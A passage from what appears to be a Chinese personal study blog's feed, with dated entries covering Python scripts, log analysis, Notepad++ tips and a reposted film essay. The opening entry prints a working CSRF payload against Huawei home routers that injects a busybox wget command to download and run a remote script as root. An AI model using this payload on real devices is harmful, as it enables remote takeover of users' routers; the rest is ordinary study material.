class="line">Authorization: Digest username=&quot;dslf-config&quot;, realm=&quot;HuaweiHomeGateway&quot;, nonce=&quot;88645cefb1f9ede0e336e3569d75ee30&quot;, uri=&quot;/ctrlt/DeviceUpgrade_1&quot;, response=&quot;3612f843a42db38f48f59d2a3597e19c&quot;, algorithm=&quot;MD5&quot;, qop=&quot;auth&quot;, nc=00000001, cnonce=&quot;248d1a2560100669&quot;</span><br></pre></td></tr></table></figure><p>用表单来构造一个XML的请求包了。为了不让浏览器对请求体编码，需要指定表单的enctype为text&#x2F;plain，利用input标签的name和value两个属性的值可以构造出我们想要的内容。<br>最终构造的CSRF攻击payload样例如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&#x27;document.forms[0].submit()&#x27;&gt;</span><br><span class="line">  &lt;form method=&#x27;POST&#x27; enctype=&#x27;text/plain&#x27; action=&quot;http://dslf-config:admin@192.168.1.1:37215/ctrlt/DeviceUpgrade_1&quot;&gt;</span><br><span class="line">    &lt;input name=&#x27;&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;&lt;NewStatusURL&gt;a&#x27; value=&#x27;1;$(/bin/busybox wget -g 192.168.1.2 -l /tmp/.f -r /b);&lt;/NewStatusURL&gt;&lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;&lt;/u:Upgrade&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;&#x27;&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>攻击者只要诱使用户访问包含上述代码的页面，存在漏洞的路由器就会远程下载一个bash脚本并以root的身份执行。</p><h1 id="v2rayN-vmess每日更新"><a href="#v2rayN-vmess每日更新" class="headerlink" title="v2rayN(vmess每日更新)"></a>v2rayN(vmess每日更新)</h1><blockquote><p><a href="https://jichangdaquan.com/node/429.html">https://jichangdaquan.com/node/429.html</a></p></blockquote><h1 id="CVE每日更新"><a href="#CVE每日更新" class="headerlink" title="CVE每日更新"></a>CVE每日更新</h1><p>链接中包含每日获取cve发送到邮箱的脚本</p><blockquote><p><a href="https://www.freebuf.com/articles/es/228571.html">https://www.freebuf.com/articles/es/228571.html</a></p></blockquote><p>每日cve更新的链接，如下：</p><blockquote><p><a href="https://cassandra.cerias.purdue.edu/CVE_changes/today.html">https://cassandra.cerias.purdue.edu/CVE_changes/today.html</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习&lt;/p&gt;</summary>
    
    
    
    <category term="每日学习小结" scheme="http://example.com/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/"/>
    
    
    <category term="VPN" scheme="http://example.com/tags/VPN/"/>
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
    <category term="流量分析" scheme="http://example.com/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    <category term="CVE" scheme="http://example.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>3-13</title>
    <link href="http://example.com/2020/03/13/3.13/"/>
    <id>http://example.com/2020/03/13/3.13/</id>
    <published>2020-03-13T00:55:57.000Z</published>
    <updated>2020-03-16T07:56:14.874Z</updated>
    
    <content type="html"><![CDATA[<p>学习python，将数据库导入内存</p><span id="more"></span><h1 id="读取文本文件内容转化为list"><a href="#读取文本文件内容转化为list" class="headerlink" title="读取文本文件内容转化为list"></a>读取文本文件内容转化为list</h1><p>1.目的</p><p>读取cal.txt内容，然后通过python脚本转化为list内容</p><p>2.文件内容</p> <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cal.txt</span><br><span class="line"></span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td></tr></table></figure><p>cal.py脚本内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding = UFT-8</span></span><br><span class="line">result=[]</span><br><span class="line">fd = file( <span class="string">&quot;cal.txt&quot;</span>, <span class="string">&quot;r&quot;</span> )</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> fd.readlines():</span><br><span class="line">    result.append(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,line.split(<span class="string">&#x27;,&#x27;</span>))))</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">    <span class="keyword">for</span> it <span class="keyword">in</span> item:</span><br><span class="line">       <span class="built_in">print</span> it</span><br></pre></td></tr></table></figure><p>执行结果内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[[<span class="number">12</span>], [<span class="number">13</span>], [<span class="number">14</span>], [<span class="number">15</span>], [<span class="number">16</span>]]</span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="number">13</span></span><br><span class="line"><span class="number">14</span></span><br><span class="line"><span class="number">15</span></span><br><span class="line"><span class="number">16</span></span><br></pre></td></tr></table></figure><h1 id="sqlite3数据库加载内存"><a href="#sqlite3数据库加载内存" class="headerlink" title="sqlite3数据库加载内存"></a>sqlite3数据库加载内存</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import sqlite3</span><br><span class="line"></span><br><span class="line">new_db = sqlite3.connect(&#x27;:memory:&#x27;) # create a memory database</span><br><span class="line"></span><br><span class="line">old_db = sqlite3.connect(&#x27;test.db&#x27;)</span><br><span class="line"></span><br><span class="line">query = &quot;&quot;.join(line for line in old_db.iterdump())</span><br><span class="line"></span><br><span class="line"># Dump old database in the new one. </span><br><span class="line">new_db.executescript(query)</span><br></pre></td></tr></table></figure><h1 id="在for循环里提前返回下一行的值"><a href="#在for循环里提前返回下一行的值" class="headerlink" title="在for循环里提前返回下一行的值"></a>在for循环里提前返回下一行的值</h1><blockquote><p><a href="https://www.jb51.net/article/128985.htm">https://www.jb51.net/article/128985.htm</a></p></blockquote><p>创建迭代器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">status_iterator = iter(i)</span><br><span class="line"></span><br><span class="line">print (next(status_iterator))</span><br></pre></td></tr></table></figure><p>循环读取文件的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line"> </span><br><span class="line"># 打开文件</span><br><span class="line">fo = open(&quot;runoob.txt&quot;, &quot;r+&quot;)</span><br><span class="line">print &quot;文件名为: &quot;, fo.name</span><br><span class="line"> </span><br><span class="line">for index in range(5):</span><br><span class="line">    line = fo.next()</span><br><span class="line">    print &quot;第 %d 行 - %s&quot; % (index, line)</span><br><span class="line"> </span><br><span class="line"># 关闭文件</span><br><span class="line">fo.close()</span><br></pre></td></tr></table></figure><p>以上实例输出结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">文件名为:  runoob.txt</span><br><span class="line">第 0 行 - 这是第一行</span><br><span class="line"></span><br><span class="line">第 1 行 - 这是第二行</span><br><span class="line"></span><br><span class="line">第 2 行 - 这是第三行</span><br><span class="line"></span><br><span class="line">第 3 行 - 这是第四行</span><br><span class="line"></span><br><span class="line">第 4 行 - 这是第五行</span><br></pre></td></tr></table></figure><h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>  怎样查找当前记录的下一条记录呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">li1 = [3, 4, 5, 6, 7]</span><br><span class="line">i = 0</span><br><span class="line">for rec in li1:</span><br><span class="line">    print &quot;this record is: &quot; + str(rec)</span><br><span class="line">    if i + 1 &lt; len(li1):</span><br><span class="line">        print &quot;next record is: &quot; + str(li1[i + 1]       </span><br><span class="line">    else:</span><br><span class="line">        print &quot;the last record!&quot;</span><br><span class="line">    print &#x27;\n&#x27;</span><br><span class="line">    i += 1</span><br></pre></td></tr></table></figure><p>​       运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">this record is: 3</span><br><span class="line">next record is: 4</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">this record is: 4</span><br><span class="line">next record is: 5</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">this record is: 5</span><br><span class="line">next record is: 6</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">this record is: 6</span><br><span class="line">next record is: 7</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">this record is: 7</span><br><span class="line">the last record!</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习python，将数据库导入内存&lt;/p&gt;</summary>
    
    
    
    <category term="每日学习小结" scheme="http://example.com/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/"/>
    
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
    <category term="数据库处理" scheme="http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%84%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>3-12</title>
    <link href="http://example.com/2020/03/12/3.12/"/>
    <id>http://example.com/2020/03/12/3.12/</id>
    <published>2020-03-12T03:55:57.000Z</published>
    <updated>2020-03-16T07:32:54.146Z</updated>
    
    <content type="html"><![CDATA[<p>哈哈，记录一下菜菜的一天</p><span id="more"></span><h1 id="系统锁屏壁纸存放位置"><a href="#系统锁屏壁纸存放位置" class="headerlink" title="系统锁屏壁纸存放位置"></a>系统锁屏壁纸存放位置</h1><p>C:\Users\用户名\appdata\Local\Packages\Microsoft.Windows.ContentDeliveryManager\Local</p><h1 id="python按行切割txt为多个文件"><a href="#python按行切割txt为多个文件" class="headerlink" title="python按行切割txt为多个文件"></a>python按行切割txt为多个文件</h1><p>可以用notepad++–编辑–开始&#x2F;结束选择–ctrl-G定位行–开始&#x2F;结束选择–复制粘贴新建</p><p>主要使用的菜单</p><p>英文是：Edit-&gt;Begin&#x2F;End Select<br>中文是：编辑-&gt;开始&#x2F;结束 选择</p><p>操作步骤：<br>1、ctrl+g跳转到10000行位置，在行号栏位置右键点击，选择（Edit-&gt;Begin&#x2F;End Select）菜单，使菜单处于勾选状态；<br>2、ctrl+g跳转到20000行位置，在行号栏位置右键点击，选择（Edit-&gt;Begin&#x2F;End Select）菜单，这时可以看到就选择了10000行-20000行之间的文本，（Edit-&gt;Begin&#x2F;End Select）菜单处于未勾选状态。</p><p>done!</p><h1 id="正则匹配字符数字"><a href="#正则匹配字符数字" class="headerlink" title="正则匹配字符数字"></a>正则匹配字符数字</h1><p>^[A-Za-z0-9]+$</p><p>notepad++查找字符，在当前文件中查找，复制结果</p><blockquote><p><a href="http://blog.nsfocus.net/emergency-response-case-study/">http://blog.nsfocus.net/emergency-response-case-study/</a></p><p><a href="https://wangzhan.qianxin.com/Activity/xingtu">https://wangzhan.qianxin.com/Activity/xingtu</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;哈哈，记录一下菜菜的一天&lt;/p&gt;</summary>
    
    
    
    <category term="每日学习小结" scheme="http://example.com/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/"/>
    
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
    <category term="日志分析" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
    
    <category term="正则" scheme="http://example.com/tags/%E6%AD%A3%E5%88%99/"/>
    
    <category term="notepad++" scheme="http://example.com/tags/notepad/"/>
    
  </entry>
  
  <entry>
    <title>3-11</title>
    <link href="http://example.com/2020/03/11/3.11/"/>
    <id>http://example.com/2020/03/11/3.11/</id>
    <published>2020-03-11T02:01:57.000Z</published>
    <updated>2020-03-19T10:15:39.778Z</updated>
    
    <content type="html"><![CDATA[<p>今日份划水，又划到了日志，哭了。。。</p><span id="more"></span><h1 id="关于日志中关键字统计"><a href="#关于日志中关键字统计" class="headerlink" title="关于日志中关键字统计"></a>关于日志中关键字统计</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>统计日志中出现关键字的次数和IP，现在只是个demo，后续可以添加到数据库进行统计查询</p><p>需要用到的模块 numpy、os、re</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">numpy模块离线安装,这里提供py37的win64版本</span><br><span class="line"></span><br><span class="line">离线模块安装pip install numpy-1.18.1-cp37-cp37m-win_amd64.whl</span><br><span class="line"></span><br><span class="line">https://files.pythonhosted.org/packages/a9/38/f6d6d8635d496d6b4ed5d8ca4b9f193d0edc59999c3a63779cbc38aa650f/numpy-1.18.1-cp37-cp37m-win_amd64.whl</span><br></pre></td></tr></table></figure><h2 id="脚本代码demo-py"><a href="#脚本代码demo-py" class="headerlink" title="脚本代码demo.py"></a>脚本代码demo.py</h2><p>直接上脚本吧！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf8 -*-</span><br><span class="line"># author：  熊猫在路上</span><br><span class="line"># 分析日志中出现关键字的次数和IP</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import numpy</span><br><span class="line">#离线模块安装pip install numpy-1.18.1-cp37-cp37m-win_amd64.whl</span><br><span class="line">path = &quot;C:/loganylics/logfile&quot; #文件夹目录</span><br><span class="line">files= os.listdir(path) #得到文件夹下的所有文件名称</span><br><span class="line">countX = []</span><br><span class="line">for file in files: #遍历文件夹</span><br><span class="line">     if not os.path.isdir(file): #判断是否是文件夹，不是文件夹才打开</span><br><span class="line">          f = open(path+&quot;/&quot;+file); #打开文件</span><br><span class="line">          iter_f = iter(f); #创建迭代器</span><br><span class="line">          #str = &quot;&quot;</span><br><span class="line">          for line in iter_f: #遍历文件，一行行遍历，读取文本</span><br><span class="line">              if line.find(&quot;xiong&quot;) &gt; -1:</span><br><span class="line">                 #str = str + line</span><br><span class="line">                 #</span><br><span class="line">                 result = re.findall(r&quot;\b(?:[0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot;, line)</span><br><span class="line">                 print(&quot;包含xiong的IP地址：&quot;,result)</span><br><span class="line">                 #每个文件的文本存到list中.这里获取到的是数组[]，需要join成字符串string类型</span><br><span class="line">                 countX.append(&#x27;&#x27;.join(result)) </span><br><span class="line">#转换list为set，得到统计的不同类型ip</span><br><span class="line">#unhashable type: &#x27;list&#x27;</span><br><span class="line">#countSet=set(countX)</span><br><span class="line">countSet=numpy.unique(countX)</span><br><span class="line">#print(&#x27;包含zhengkai.blog.csdn.net的IP的个数：&#x27;+len(countSet))</span><br><span class="line">logfile = open(&quot;C:/loganylics/reault.txt&quot;, &#x27;w+&#x27;)  </span><br><span class="line">for ip in countSet:</span><br><span class="line">#</span><br><span class="line">    #print (&#x27; IP:&#x27;,ip,&#x27; 出现次数:&#x27;,countX.count(ip))</span><br><span class="line">    #用英文逗号,连接，方便在excel的数据 从文本导入中格式化导入</span><br><span class="line">    print (&#x27;字符[xiong]出现次数,&#x27;,countX.count(ip),&#x27;,IP,&#x27;,ip,file=logfile)</span><br></pre></td></tr></table></figure><h2 id="文件树结构"><a href="#文件树结构" class="headerlink" title="文件树结构"></a>文件树结构</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\loganylics</span><br><span class="line">│  demo.py</span><br><span class="line">│  numpy-1.18.1-cp37-cp37m-win_amd64.whl</span><br><span class="line">│  reault.txt</span><br><span class="line">└─-logfile</span><br><span class="line">        access.log</span><br><span class="line">        </span><br></pre></td></tr></table></figure><h2 id="样本日志文件access-log"><a href="#样本日志文件access-log" class="headerlink" title="样本日志文件access.log"></a>样本日志文件access.log</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.1.1.1 - - [30/Apr/2015:00:34:55 +0800] “POST /iDataService/services/MemRoomService HTTP/1.0” 200 405 “-” “Axis/1.4” “-”</span><br><span class="line">1.1.1.2 - - [30/Apr/2015:00:34:55 +0800] “POST /iDataService/services/CutLoginService HTTP/1.1” 200 438 “-” “Apache CXF 2.7.8” “-”</span><br><span class="line">1.1.1.3 - - [20/Apr/2015:00:34:55 +0800] “POST /iDataService/services/NoticeListService HTTP/1.1” 200 656 “-” “Apache CXF 2.7.8” “-”</span><br><span class="line">1.1.1.4 - - [30/Apr/2016:00:34:56 +0800] “POST /iDataService/services/MemSelfQueryService HTTP/1.0” 200 1344 “-” “Axis/1.4” “-“</span><br><span class="line">1.1.1.5 - - [30/Apr/2015:00:34:55 +0800] “POST /iDataService/services/MemRoomService HTTP/1.0” 200 405 “-” “Axis/1.4” “-”</span><br><span class="line">1.1.1.6 - - [30/Apr/2015:00:34:55 +0800] “POST /iDataService/services/CutLoginService HTTP/1.1” 200 438 “-” “xiongmao CXF 2.7.8” “-”</span><br><span class="line">1.1.1.7 - - [20/Apr/2015:00:34:55 +0800] “POST /iDataService/services/NoticeListService HTTP/1.1” 200 656 “-” “xiong CXF 2.7.8” “-”</span><br><span class="line">1.1.1.8 - - [30/Apr/2016:00:34:56 +0800] “POST /iDataService/services/MemSelfQueryService HTTP/1.0” 200 1344 “-” “Axis/1.4” “-“</span><br></pre></td></tr></table></figure><h2 id="输出结果reault-txt"><a href="#输出结果reault-txt" class="headerlink" title="输出结果reault.txt"></a>输出结果reault.txt</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字符[xiong]出现次数, 1 ,IP, 1.1.1.6</span><br><span class="line">字符[xiong]出现次数, 1 ,IP, 1.1.1.7</span><br></pre></td></tr></table></figure><h2 id="改进和优化"><a href="#改进和优化" class="headerlink" title="改进和优化"></a>改进和优化</h2><p>感觉写的还是很粗糙，后续加入logging、sqlite3模块，打印日志并导入数据库，还有就是对于大文件的处理可能还是要用到多线程，以及导出excel表格分析也是可以的。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今日份划水，又划到了日志，哭了。。。&lt;/p&gt;</summary>
    
    
    
    <category term="每日学习小结" scheme="http://example.com/categories/%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93/"/>
    
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
    <category term="日志分析" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
    
    <category term="毕业设计" scheme="http://example.com/tags/%E6%AF%95%E4%B8%9A%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>3-10</title>
    <link href="http://example.com/2020/03/10/3.10/"/>
    <id>http://example.com/2020/03/10/3.10/</id>
    <published>2020-03-10T10:36:24.000Z</published>
    <updated>2020-03-23T09:29:56.893Z</updated>
    
    <content type="html"><![CDATA[<p>更换托管平台，转载一篇文章</p><span id="more"></span><h1 id="后来的我们"><a href="#后来的我们" class="headerlink" title="后来的我们"></a>后来的我们</h1><p><img src="http://www.xt996.top/muggle/2020/03/10/3.10/1.jpg"></p><p><strong>01</strong></p><p>曾经，我以为自己是个很幽默的人，比如逗女孩开心，讲的是这样的笑话。</p><p>一只蚂蚁第一次出门觅食，突然下起了雨，它不知道怎么回到蚁窝，这时遇见了另外一只蚂蚁，于是问：“你都如何回蚁窝？” </p><p>另一只蚂蚁答：“带……带着笑或是很沉默？ ”</p><p>后来，我真的听了很多遍《后来》，初听不知曲中意，再听已是曲中人。刘若英唱得淡淡的，却情深意切。</p><p>遗失一些曾经的美好，经历几段感情的波折，才明白人生真就是一部肥皂剧，狗血的桥段随时在你身边上演，却都不是happy ending。</p><p>多年以前，我觉得《后来》最戳心的歌词是“你都如何回忆我，带着笑或是很沉默”，而现在，反倒更关注“这些年来，有没有人能让你不寂寞”这一句。</p><p>也许经历这样一个过程，才是真正的放下了。我最多只想知道过得你好不好，却不再去幻想我们之间是否还有别的可能。哪怕你睡醒后看到的人不再是我，我也会因为你可以拥有幸福而开心。</p><p>“后来，终于在眼泪中明白，有些人一旦错过就不再。”</p><p><strong>02</strong></p><p>时隔17年，刘若英把《后来》拍成了《后来的我们》。</p><p>上映第一天，我就去电影院看了，虽然没有期待中的惊艳，但是故事情节完整，演技画面在线，有被触动的部分，已经算是值回票价。尤其是最后林父写的那封信，让我一下子就泪奔了。</p><p>见清和小晓，两个北漂的青年，因为患难而走到一起，相爱又契合。但他们都是一身缺点的俗人，尚不成熟的性格，对待感情的莽撞，甚至物质的匮乏，都让他们在感情里走得跌跌撞撞。</p><p>分手于他们而言，从一开始就注定，如果没有失去挚爱的痛楚，就不会有见清后来的功成名就。</p><p>如果换成从前的我，肯定会觉得见清没做错什么，全程都是小晓在作。你要的沙发、大房子、北京户口，我一直都在努力给你，只是还需要一点时间，你为什么还要赌气离开我？</p><p>生活中也有很多见清那样的人，不开心了就用冷暴力逼女孩离开，自己还一脸茫然地说，你要的我都给你了啊？你怎么还不满足？</p><p>可是，男女思维并不一样，你觉得她想要的是那些物质，而她真正想要的，是被你认定的感觉。她想要本地的房子，是想真正安定下来不用再被房东一个电话赶走，她想有自己的沙发，是想和你在一起时可以想肆无忌惮地蹦跶。她想要的是欢乐的时光可以永远延续下去，而不是你的颓废和冷暴力。</p><p>电影让人触动的地方，是恋爱的美好和离开的决绝，都太真实了。有些人最后没能走到一起，不是因为不爱了，只是互相了解，互相折磨，终于有一方受不了，攒够了失望。</p><p>在爱情面前，美好的时光就像夜空一颗忽闪而过的流星，擦亮了你我，但转瞬即逝。你回忆起的往事，不过是灿烂背后的冷寂，酸楚背后的坚强，幽怨背后的珍惜。</p><p><strong>03</strong></p><p>高中时代，我有两个铁磁兄弟，其中一个叫左逸，文理分科的时候选择了文，高二就和学霸女友林楠偷吃了禁果。</p><p>想比之下，那时的我还不开窍，即便也有过心动的文科班女孩，却只是欣赏她一颦一笑裙摆飘飘的样子，只要能和她单独相处几分钟，便能在心里乐开了花。</p><p>记得有一次去配钥匙，本来都配好了，看到她来了，假装自己刚刚到，立即要求师傅再配一把。</p><p>而左逸的爱情，是和肉欲纠缠在一起的。尽管一向高冷，他也会在和我们一起躺在草坪聊天的时候，说起他的床上功夫，成为我们铁三角在这些冷门知识方面的启蒙者。</p><p>进入高三以后，他和林楠处于周末同居的状态，林楠是全县文科的前十强，搞到最后勉强才上得二本，当时有一种谣传，说她是因为高考体检查出了怀孕。</p><p>只有我清楚那并不是谣传，她那次从那个像作坊一样的小黑屋出来，差点就没能醒过来。</p><p>更加遗憾的是，左逸没能和林楠考进同一所大学，他的周末和假期大部分时间都耗费在火车上，只要有空就会去看林楠，折腾到后来只为陪伴，连滚床单都少了。</p><p>堕胎的事让林楠的父母觉得蒙羞，便赌气把她送到左逸家，就不管不顾了。左逸的父母同意供她读完大学，但坚决反对她和左逸在一起。</p><p>他们嫌弃林楠生得瘦小不好生养，一张哭脸克夫相，左逸和家里闹得不可开交，甚至吵到要和父母断绝关系的地步。</p><p>左逸的态度始终很坚决——我这辈子就只会娶林楠这一个女孩。</p><p><strong>04</strong></p><p>关系稍缓和是大四那年，左逸的父亲做心脏移植手术，林楠像儿媳妇一样前前后后担惊受怕照顾了三个多月，甚至连学业也荒废了，延迟一年毕业。</p><p>左父换掉的心脏似乎有了新的温度，终于接受了林楠。</p><p>毕业后，左逸考进银行工作，林楠成了乡村特岗教师。只是左逸太忙了，忙到无暇再去看望身在异地的林楠，父亲的病需要长期服昂贵的药物，他必须赚很多钱才能让父亲续命。</p><p>又过了两年，左逸奉子成婚，新娘是一个同事，岳父能在事业上助左逸一路直进。</p><p>大婚前夜，左逸约我们铁三角喝酒，他说：“以前父亲健康的时候，我天不怕地不怕，以为爱情最伟大，现在我的天塌了，只想多赚点钱，和谁过日子没区别。”</p><p>另一个兄弟问：“那林楠算什么？”</p><p>左逸红着眼眶说：“算她瞎了眼，遇人不淑吧。”</p><p>我也发起了酒疯，说：“一切都是托词，一切都是借口。我更觉得我们都是渣男，爱一个人的时候，她是天，是信仰，是捧在手心里的宝贝，是无与伦比的美好。不爱她了，她就是一堆尘土，一地玻璃渣子，没人要的垃圾，都不惜多看一眼。”</p><p>说这话的时候，我仿佛还能听见左逸态度坚决地说，我这辈子就只会娶林楠这一个女孩。</p><p><strong>05</strong></p><p>在看《后来的我们》的过程中，我最心疼的其实见清的老婆，不仅老公一直放不下前任，公公在车站还抓着她的手，喊的却是另一个女孩的名字。</p><p>而见清，其实也是个渣男，多次对小晓使用冷暴力，小晓提出分手上了地铁，他追了出去却没有勇气跟她走。因为小晓说了，如果他追上去就会跟他一辈子。</p><p>而且他还是出轨惯犯。和小晓在一起的时候，穷困潦倒了还在网上撩妹；结婚了过年回不去，老婆也不放心他，让儿子通过视频查岗；如果不是刚好被同事撞上，他估计还会把小晓推倒；他问，如果我们还在一起呢？小晓说，那你已经找了不下十个小三了。</p><p>这样看来，在爱情里最受伤的，其实是女生啊。见清娶妻生子，灶边炉台，金钱地位都有了，只有小晓还在只身漂泊，还没遇到一个靠谱的，值得托付终身的人。</p><p>故事在别人的笔下，很多都是以大团圆结局，而发生在我们身上的，却变得面目全非。</p><p>在别人的故事里，到最后都会有一个超级英雄来终结一切拯救世界，而我们的世界里，只有自己能拯救自己。</p><p><strong>06</strong></p><p>毕鑫业的微电影《再见金华站》有这样一句台词：某天，你无端想起一个人，他曾让你对明天充满期许，但是却完全没有出现在你的明天里。</p><p>我们的一生，本就是充满遗憾的艺术，那个曾经想为你上九天揽月的人，也许已经揽着别人睡着了，那个曾经想为你下五洋捉鳖的人，可能正被别人捉奸在床。</p><p>就像电影的台词，后来我们什么都有了，却没有我们。缘分这事，能不负对方就好，想要不负此生，真的很难。</p><p>也像观众的感慨，慢慢